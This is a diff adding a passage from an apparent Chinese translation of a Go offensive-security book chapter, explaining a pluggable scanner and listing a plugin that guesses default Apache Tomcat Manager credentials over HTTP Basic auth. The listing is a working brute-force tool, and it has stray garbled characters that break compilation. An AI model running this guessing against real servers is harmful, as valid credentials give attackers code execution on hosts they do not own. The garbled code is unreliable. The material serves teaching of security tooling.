@@ -133,3 +133,81 @@ func main() {
 假定插件已经含有名为 `New` 的符号，对符号进行类型断言，将其转成 `func() scanner.Checker` 类型。即，期望符号是一个返回实现了 `scanner.Checker` 的对象的函数。将转换后的值赋给一个名为 `newFunc` 的变量。然后调用它，并将返回值赋值给变量 `check` 。幸亏类型断言，才能判断是否符合 `scanner.Checker` 接口，所以必须要实现 `Check()` 函数。调用并传参目标主机和端口。结果为 `*scanner.Result` ，赋值给变量 `res` 并检查以确定服务是否容易受到攻击。
 
 注意，这个过程是通用的；它使用类型断言和接口来创建一个结构，通过这个结构可以动态地调用插件。代码中没有专门的单个漏洞签名或用于检查漏洞是否存在的方法。相反，已经对功能进行了足够的抽象，以至于插件开发人员可以创建独立的插件来执行工作单元，而不需要了解其他插件，甚至不需要了解使用应用程序。插件作者必须关心的惟一一件事是正确地创建导出的 `New()` 函数和实现 `scann . checker` 的类型。来看一下实现这一点的插件。
+
+### 构建密码猜测插件
+
+插件（清单10-3）对 Apache Tomcat Manager 登录入口进行密码猜测攻击。这也是黑客喜欢攻击的目标，这种入口通常将其配置为容易猜测的凭证。有了有效的凭证，黑客就可以在底层系统上可靠地执行任意代码。黑客非常容易获胜。
+
+在对代码的审查中，没有涉及到漏洞测试的具体细节，因为实际上只是一系列发送到特定URL的HTTP请求。相反，主要专注于满足可插入扫描器的接口需求。
+
+```go
+import (
+	// Some snipped for brevity 
+    "github.com/bhg/ch-10/plugin-core/scanner" u
+)
+
+var Users = []string{"admin", "manager", "tomcat"}
+var Passwords = []string{"admin", "manager", "tomcat", "password"}
+
+// TomcatChecker implements the scanner.Check interface. Used for guessing Tomcat creds 
+type TomcatChecker struct{}
+
+// Check attempts to identify guessable Tomcat credentials
+func (c *TomcatChecker) Check(host string, port uint64) *scanner.Result {
+    var (
+        resp *http.Response err error
+        url string
+        res *scanner.Result 
+        client *http.Client 
+        req *http.Request
+    )
+    log.Println("Checking for Tomcat Manager...") 
+    res = new(scanner.Result)
+    url = fmt.Sprintf("http://%s:%d/manager/html", host, port) 
+    if resp, err = http.Head(url); err != nil {
+    	log.Printf("HEAD request failed: %s\n", err)
+    	return res 
+    }
+	log.Println("Host responded to /manager/html request")
+	// Got a response back, check if authentication required
+	if resp.StatusCode != http.StatusUnauthorized || resp.Header.Get("WWW-Authenticate") == "" {
+		log.Println("Target doesn't appear to require Basic auth.")
+		return res 
+    }
+    
+    // Appears authentication is required. Assuming Tomcat manager. Guess passwords... 
+    log.Println("Host requires authentication. Proceeding with password guessing...") 
+    client = new(http.Client)
+    if req, err = http.NewRequest("GET", url, nil); err != nil {
+    	log.Println("Unable to build GET request")
+    	return res 
+    }
+    for _, user := range Users {
+    	for _, password := range Passwords {
+    		req.SetBasicAuth(user, password)
+            if resp, err = client.Do(req); err != nil {
+            	log.Println("Unable to send GET request")
+            	continue 
+            }
+        	if resp.StatusCode == http.StatusOK {y
+        		res.Vulnerable = true
+        		res.Details = fmt.Sprintf("Valid credentials found - %s:%s", user, password) 
+                return res
+        	} 
+        }
+    }
+    return res 
+}
+// New is the entry point required by the scanner 
+func New() scanner.Checker {
+    return new(TomcatChecker) 
+}                                                                         
+```
+
+清单 10-3: 创建源生地 Tomcat 凭证猜测插件 (https://github.com/blackhat-go/bhg/ch-10/plugin-tomcat/main.go/)
+
+首先，需要导入前面详细介绍过的 `scanner` 包。该包定义 `Checker` 接口和将要构建的 `Result` 结构体。首先定义名为 `TomcatChecker` 的一个空 `struct` 类型来实现 `Checker` 。要想满足 `Checker` 接口的实现需求，创建方法匹配 `Check(host string, port uint64) *scanner.Result` 。使用这些代码执行所有通用的漏洞检查逻辑。
+
+由于期望返回 `*scanner.Result` ，初始化，并将其赋值给名为 `res` 的变量。如果条件满足——即，如果检查验证了可猜测的凭证，则确认了漏洞，将 `res.Vulnerable` 设置为 `true`，将 `res.Details` 设置为含有可识别的凭证的消息。如果漏洞不是可识别的，那么返回的实例的 `res.Vulnerable` 将被设置为默认的状态——`false` 。
+
+最后，定义了需要导出的函数 `New() *scanner .Checker`。这符合扫描器调用 `Lookup()` 所设置的预期，以及实例化插件定义的`TomcatChecker` 所需要的类型断言和转换。这个基本入口点只是返回一个新的 `*TomcatChecker`（由于其实现了所必须的 `Check() 方法，因此恰好是一个 `scanner.Checker`）。
